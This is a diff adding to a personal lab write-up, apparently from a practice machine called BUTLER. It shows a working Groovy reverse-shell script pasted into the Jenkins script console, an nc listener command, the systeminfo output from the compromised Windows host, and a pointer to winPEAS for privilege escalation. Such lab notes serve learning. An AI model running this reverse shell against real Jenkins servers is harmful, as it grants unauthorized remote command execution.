@@ -134,7 +134,97 @@ We were able to log in.
 ![[Pasted image 20240708193449.png]]
 
 #groovyreverseshell #revershelljenkins #exploitgroovyreverseshell
+#githubgroovyreverseshell
 
 Source:
 - https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
 - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 - githubgroovyreverseshell
+
+Copy the script in the script console of jenkins
+
+```
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+jenkins script console with reverse shell below
+
+![[Pasted image 20240708194235.png]]
+
+Run nc -nvlp 8044 in your machine then  run the script in jenkins
+
+```
+┌──(root㉿kali)-[~]
+└─# nc -nvlp 8044                                   
+listening on [any] 8044 ...
+
+```
+
+
+![[Pasted image 20240708194618.png]]
+
+Check `systeminfo` of the machine to enumerate
+
+```
+C:\Program Files\Jenkins>systeminfo
+systeminfo
+
+Host Name:                 BUTLER
+OS Name:                   Microsoft Windows 10 Enterprise Evaluation
+OS Version:                10.0.19043 N/A Build 19043
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          butler
+Registered Organization:   
+Product ID:                00329-20000-00001-AA079
+Original Install Date:     8/14/2021, 3:51:38 AM
+System Boot Time:          7/8/2024, 7:01:31 PM
+System Manufacturer:       QEMU
+System Model:              Standard PC (Q35 + ICH9, 2009)
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 15 Model 107 Stepping 1 AuthenticAMD ~1000 Mhz
+BIOS Version:              EFI Development Kit II / OVMF 0.0.0, 2/6/2015
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,045 MB
+Available Physical Memory: 1,569 MB
+Virtual Memory: Max Size:  3,197 MB
+Virtual Memory: Available: 2,363 MB
+Virtual Memory: In Use:    834 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 4 Hotfix(s) Installed.
+                           [01]: KB4601554
+                           [02]: KB5000736
+                           [03]: KB5001330
+                           [04]: KB5001405
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Ethernet 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.64.1
+                                 IP address(es)
+                                 [01]: 192.168.64.7
+                                 [02]: fe80::617e:9fd5:8bfa:b78f
+                                 [03]: fd7b:a420:b5d1:f991:95d1:b628:96fd:1f60
+                                 [04]: fd7b:a420:b5d1:f991:617e:9fd5:8bfa:b78f
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+```
+
+
+#winpeas
+#privilegescalationwindows
+
+>> Search winpeas in google and download the latest bersion
+
+#download
